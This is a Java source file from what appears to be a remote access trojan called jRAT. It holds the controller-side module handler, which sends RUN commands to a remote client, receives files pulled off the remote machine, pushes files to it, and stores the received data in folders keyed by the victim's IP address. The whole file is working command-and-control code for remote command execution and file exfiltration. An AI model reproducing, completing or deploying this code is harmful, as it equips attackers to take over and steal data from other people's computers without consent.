package jRAT.moduleHandlers;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.net.Socket;
import java.util.Collections;
import java.util.HashMap;
import java.util.Map;

import jRAT.server.JRATUtils;
import jRAT.server.JRATServer;

public class HandlerModuleCore {

    private static int BUFFER_SIZE = 1024;

    /* This mapping is used so that local path is not sent over the network */
    static Map<String,String> remoteToLocalPathMapping = Collections.synchronizedMap(new HashMap<String,String>()); 

    /* ----------------------------------------------------------------------------------------------------------------------- */

    public static void startDataThreadHandler(Socket socket, DataInputStream input, DataOutputStream output, String helloMessage)
    {
        try
        {
            while (true)
            {
                String responseCode = input.readUTF();

                if (responseCode.equals("CLOSE"))
                    break;
                else if (responseCode.equals("OK"))
                {
                    String methodName       = input.readUTF();
                    if (methodName.equals("bgdownload"))
                        processBGDownloadResponse(input, output);
                    else if (methodName.equals("bgupload"))
                        processBGUploadResponse(input, output);
                    else
                    {
                        String filename     = input.readUTF();
                        long responseLength = input.readLong();
                        byte[] response     = new byte[(int)responseLength];
                        input.readFully(response);
                        JRATUtils.saveBytesToFile(JRATServer.getRemoteIP() + "/" + helloMessage + "/" + filename, response);    
                    }
                }
            }
        }
        catch (Exception ex) {}
        finally
        {
            try { input.close(); output.close(); socket.close(); }
            catch (Exception ex) {}
        }
    }

    /* ----------------------------------------------------------------------------------------------------------------------- */

    private static void processBGDownloadResponse(DataInputStream input, DataOutputStream output)
    {
        FileOutputStream fileOutput = null;
        try
        {
            String remotePath = input.readUTF();
            String localPath  = remoteToLocalPathMapping.get(remotePath);
            if (localPath == null)
                output.writeUTF("NOK");
            else
            {
                output.writeUTF("OK");
                remoteToLocalPathMapping.remove(remotePath);

                fileOutput = new FileOutputStream(new File(localPath));

                long rawFileSize       = input.readLong();
                long totalBytesWritten = 0;
                int numberOfBytesRead  = 0;
                final byte[] buffer    = new byte[BUFFER_SIZE];

                while (totalBytesWritten < rawFileSize)
                {
                    if ((rawFileSize-totalBytesWritten) < BUFFER_SIZE)
                        numberOfBytesRead = input.read(buffer, 0, (int)(rawFileSize-totalBytesWritten));
                    else
                        numberOfBytesRead = input.read(buffer, 0, BUFFER_SIZE);
                    
                    fileOutput.write(buffer, 0, numberOfBytesRead);
                    totalBytesWritten += numberOfBytesRead;
                }
                fileOutput.flush();
            }
        }
        catch (Exception ex) {}
        finally
        {
            try { if (fileOutput != null) fileOutput.close(); }
            catch (Exception ex) {}
        }
    }

    /* ----------------------------------------------------------------------------------------------------------------------- */

    private static void processBGUploadResponse(DataInputStream input, DataOutputStream output)
    {
        FileInputStream fileInput = null;
        try
        {
            String remotePath = input.readUTF();
            String localPath  = remoteToLocalPathMapping.get(remotePath);
            if (localPath == null)
                output.writeUTF("NOK");
            else
            {
                try { fileInput = new FileInputStream(new File(localPath)); }
                catch (Exception ex) {}

                if (fileInput == null)
                    output.writeUTF("NOK");
                else
                {
                    output.writeUTF("OK");
                    remoteToLocalPathMapping.remove(remotePath);

                    /* Send file size */
                    long fileSizeInBytes = new File(localPath).length();
                    output.writeLong(fileSizeInBytes);

                    /* Send file bytes */
                    final byte[] buffer   = new byte[BUFFER_SIZE];
                    int numberOfBytesRead = 0;                  
                    while ((numberOfBytesRead = fileInput.read(buffer)) != -1)
                    {
                        output.write(buffer, 0, numberOfBytesRead);
                    }
                    output.flush();
                }
            }
        }
        catch (Exception ex) {}
        finally
        {
            try { if (fileInput != null) fileInput.close(); }
            catch (Exception ex) {}
        }
    }
        
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /* ----------------------------------------------------------------------------------------------------------------------- */
    /* ----------------------------------------------------------------------------------------------------------------------- */

    public static void processRunCommand(DataInputStream input, DataOutputStream output, String command)
    {
        try
        {
            /* if command is bgdownload or bgupload save the local
             * and remote paths to remoteToLocalPathMapping map
             * */
            final String[] commandSections = command.split(" (?=([^\"]*\"[^\"]*\")*[^\"]*$)");
//          commandSections[0];     // RUN
//          commandSections[1];     // jeh.modules.ModuleCore
//          commandSections[2];     // methodName

            if (commandSections[2].trim().toLowerCase().equals("bgdownload"))
            {
                if (commandSections.length != 5)
                {
                    System.out.println("[ERROR]: Invalid number of params!");
                    return;
                }
                String remotePath = commandSections[3].trim();
                String localPath  = commandSections[4].trim();
                command           = commandSections[0] + " " + commandSections[1] + " " + commandSections[2] + " " + remotePath;
                remoteToLocalPathMapping.put(remotePath, localPath);
            }
            else if (commandSections[2].trim().toLowerCase().equals("bgupload"))
            {
                if (commandSections.length != 5)
                {
                    System.out.println("[ERROR]: Invalid number of params!");
                    return;
                }
                
                String localPath  = commandSections[3].trim();
                String remotePath = commandSections[4].trim();
                command           = commandSections[0] + " " + commandSections[1] + " " + commandSections[2] + " " + remotePath;
                remoteToLocalPathMapping.put(remotePath, localPath);
            }
            
            /* ----------------------------------------------------------------------- */

            output.writeUTF(command);
            String responseStatus = input.readUTF();
            if (responseStatus.equals("OK"))
            {
                long responseLength = input.readLong();
                byte[] response = new byte[(int)responseLength];

                input.readFully(response);
                System.out.println(new String(response, "UTF-8"));
            }
            else { System.out.println(responseStatus); }    
        }
        catch (Exception ex) { System.out.println("[ERROR]: Something went wrong!"); }  
    }
    
    /* ----------------------------------------------------------------------------------------------------------------------- */

}
